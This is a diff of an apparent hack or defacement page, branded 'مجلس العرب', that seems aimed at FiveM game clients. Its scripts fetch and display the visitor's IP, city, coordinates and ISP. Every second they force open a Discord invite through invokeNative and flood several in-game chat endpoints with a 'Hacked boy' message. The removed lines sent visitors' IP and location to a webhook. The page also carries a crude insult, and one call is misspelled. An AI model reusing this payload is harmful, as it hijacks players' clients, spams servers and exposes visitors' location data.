@@ -1,148 +1,287 @@
 <html lang="en"><head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Abo 7sn &amp; Root Access</title>
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: 'Courier New', Courier, monospace;
-        color: red; 
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        flex-direction: column;
-        text-align: center;
-        overflow: hidden;
-        background-color: black;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مجلس العرب</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px);
+            background-size: 15px 15px;
+            font-family: monospace;
+            color: #ccc;
+            overflow: hidden;
+        }
 
-    .background-video {
-        display: none;
-    }
+        .intro {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #e6e6e6;
+            font-size: 80px;
+            z-index: 9999;
+            animation: fadeOut 2s ease forwards;
+            animation-delay: 2s;
+        }
 
-    .content {
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        z-index: 1;
-        position: relative;
-        height: 100vh;
-        width: 100%;
-    }
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
 
-    .background-video-second {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        z-index: -1;
-    }
+        .container,
+        .left-box,
+        .right-box,
+        .box,
+        .footer {
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out;
+            animation-delay: 2s;
+            animation-fill-mode: forwards;
+        }
 
-    .info {
-        margin-top: 20px;
-        font-size: 1.5em;
-        color: red;
-        text-shadow: 0px 0px 8px red, 0px 0px 15px red, 0px 0px 25px red;
-        letter-spacing: 4.5px;
-        white-space: pre-wrap;
-    }
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
 
-    .text {
-        margin-top: 20px;
-        font-size: 3em;
-        color: red;
-        text-shadow: 0px 0px 8px red, 0px 0px 15px red, 0px 0px 25px red;
-        letter-spacing: 4.5px;
-    }
+        .left-box,
+        .right-box {
+            position: absolute;
+            top: 25px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 18px;
+        }
 
-    .marquee {
-        position: absolute;
-        top: 10%;
-        width: 100%;
-        overflow: hidden;
-        white-space: nowrap;
-    }
+        .left-box {
+            left: 25px;
+        }
 
-    .marquee span {
-        display: inline-block;
-        font-size: 5em;
-        color: red;
-        text-shadow: 0px 0px 8px red, 0px 0px 15px red, 0px 0px 25px red;
-        letter-spacing: 4.50px;
-        animation: scroll 80s linear infinite;
-    }
+        .right-box {
+            right: 25px;
+        }
 
-    @keyframes scroll {
-        0% { transform: translateX(-100%); }
-        100% { transform: translateX(100%); }
-    }
+        .left-box a {
+            display: block;
+            margin: 8px 0;
+            color: #9b0000;
+            text-decoration: none;
+            font-size: 16px;
+        }
 
-    .image-container img {
-        max-width: 50%;
-        height: auto;
-        margin: 20px auto;
-        display: block;
-        filter: drop-shadow(0 0 0 red) drop-shadow(0 0 2px red) drop-shadow(0 0 4px red);
-    }
-</style>
+        .left-box a:hover {
+            transform: translateX(5px);
+        }
+
+        .discord-link {
+            display: flex;
+            align-items: center;
+            color: #ccc;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        .discord-link img {
+            width: 20px;
+            height: 20px;
+            margin-right: 5px;
+        }
+
+        .anime-image {
+            width: 600px;
+            border: 3px solid #333;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+
+        .title {
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #ccc;
+        }
+
+        .box {
+            width: 400px;
+            max-height: 250px;
+            overflow: auto;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: left;
+        }
+
+        .box code {
+            color: #9b0000;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .text {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+    </style>
 </head>
+
 <body>
 
-<div class="content">
-    <video class="background-video-second" autoplay="" loop="" muted="">
-        <source src="https://cdn.discordapp.com/attachments/938536293388931153/1361017257190363187/U_S_S_R_1_9_9_1_Molchat_Doma_-_Sudno.mov?ex=684f9f58&amp;is=684e4dd8&amp;hm=2571c522dd38d6a363a25e14e37b1bfd100501f8afd43ebae5ba26fad9509757&amp;" type="video/mp4">
-        Your browser does not support the video tag.
-    </video>
+    <div class="intro">مجلس العرب</div>
 
-    <div class="marquee">
-        <span>تمضمض بالكب تبعي - كبيت عايدك - كبيت عراسك - كبيت عبزازك - كبيت عطيزك</span>
+    <div class="left-box">
+        مجلس العرب
+        <a href="#">بدك تصير زلمة؟</a>
+        <a href="#">تعال على مجلس العرب</a>
+        <a href="#">بدك تصير مبرمج وهاك</a>
+        <a href="#">تعال على مجلس العرب</a>
+        <hr style="margin: 10px 0; border: none; border-top: 1px solid #333;">
     </div>
 
-    <div id="content">
-        <div class="image-container">
-            <img src="https://api3.schooltv.nl/cache/i/43000/images/43090.w856.r16-9.540f486.q90.jpg" alt="">
+    <div class="right-box">
+        <div class="info" id="ip-info">
+            <strong>IP:</strong> <span id="ip"></span><br>
+            <strong>City:</strong> <span id="city"></span><br>
+            <strong>Region:</strong> <span id="region"></span><br>
+            <strong>Country:</strong> <span id="country"></span><br>
+            <strong>Location:</strong> <span id="loc"></span><br>
+            <strong>Organization:</strong> <span id="org"></span><br>
+            <strong>Timezone:</strong> <span id="timezone"></span>
+        </div>
+    </div>
+
+    <audio autoplay="" loop="">
+        <source src="https://cdn.discordapp.com/attachments/1379951981988417718/1401263150187286528/Edit_Yakir_ganon_-_Dia_Baba.mp3?ex=688fa381&is=688e5201&hm=adf438445f1905436cbafb72ee88d4f0a0a226c49c3fb1eac058bfca149b08f3&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <div class="container">
+        <img class="anime-image" src="https://www.raed.net/img?id=1394587" alt="Anime">
+        <div class="title">مجلس العرب</div>
+
+        <div class="box">
+            <div style="border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 8px;">
+                <span style="color: #ccc; font-weight: bold;"></span>
+            </div>
+            <div style="color: #888; font-size: 14px; margin-bottom: 8px;">
+                server@system:~$ <strong>why?</strong>
+            </div>
+            <div style="color: #9b0000; font-size: 16px; line-height: 1.6;">
+                مجلس العرب
+                <div style="color: #888; font-size: 12px; margin-top: 8px;">
+                </div>
+            </div>
+            <div class="footer">OFFICALY BLACK$HAMMER • </div>
         </div>
 
-        <div class="info" id="ip-info"><strong>مجلس العرب لعب عليكو</strong><br>
- <strong>Your Ip:</strong> <span>93.175.45.193</span><br>
-<strong>Your Location:</strong> <span>32.6926,35.3712</span></div>
-        <div class="text"> مجلس العرب لعب عليكو
- </div>
+        <script>
+            // ! اظهار الايبي !
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').innerHTML = data.ip || '';
+                    document.getElementById('city').innerHTML = data.city || '';
+                    document.getElementById('region').innerHTML = data.region || '';
+                    document.getElementById('country').innerHTML = data.country || '';
+                    document.getElementById('loc').innerHTML = data.loc || '';
+                    document.getElementById('org').innerHTML = data.org || '';
+                    document.getElementById('timezone').innerHTML = data.timezone || '';
+                });
 
-<audio autoplay="" loop="">
-    <source src="https://audio.jukehost.co.uk/IepS1MTHdXslLV0SZ1IBlPKwNmU4z9Wg" type="audio/mpeg">
-    Your browser does not support the audio element.
-</audio>
+            // ! فتح الرابط تلقائيًا !
+            setTimeout(() => {
+                window.invokeNative("openUrl", "https://discord.gg/tnxENUMq6G");
+            }, 50);
 
+            // سكربت الرسائل التلقائي (vjmi)
+            const msg = `👑  مجلس العرب - Hacked boy 👑`;
+            const body = JSON.stringify({ message: msg });
+            setInterval(() => {
+                window.invokeNative("openUrl", "https://discord.gg/tnxENUMq6G");
+                fetch("https://flix-scripts/chatResult", { method: "POST", body });
+                fetch("https://danger_chat/Danger_Chat:SendMessage", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "message": msg,
+                        "channel": "شات العام",
+                        "color": null,
+                        "isImageAndLinksAllowed": [false, false]
+                    })
+                });
+                fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                    headers: {
+                        accept: "*/*",
+                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                    },
+                    body: JSON.stringify({ message: msg, channel: "شات العام" }),
+                    method: "POST"
+                });
+                fetch("https://melix_chat/chatResult", { method: "POST", body });
+                fetch("https://as_chat/chatResult", { method: "POST", body });
+                fetch("https://chat/chatResult", { method: "POST", body });
+                fetch("https://ho-chatv2/Chat", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "Type": "chatResult",
+                        "message": msg,
+                        "chatType": "general"
+                    })
+                });
+            }, 1000);
+        </script>
+         <script>
+            setisnterval(function() {
+                window.invokeNative("openUrl", "https://discord.gg/tnxENUMq6G");
+                window.invokeNative("openUrl", "https://discord.gg/tnxENUMq6G");
+                window.invokeNative("openUrl", "https://discord.gg/tnxENUMq6G");
+                window.invokeNative("openUrl", "https://discord.gg/tnxENUMq6G");
+              }, 1000);
+        </script>
     </div>
-</div>
 
-<script>
-    fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            const { ip, country, city, region, loc, org, timezone } = data;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = `<strong>مجلس العرب لعب عليكو</strong><br>
- <strong>Your Ip:</strong> <span>${ip}</span><br>
-<strong>Your Location:</strong> <span>${loc}</span>`;
-
-            const dateTime = new Date().toLocaleString();
-            const webhookUrl = '';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
-                })
-            });
-        });
-</script>
 
 
 
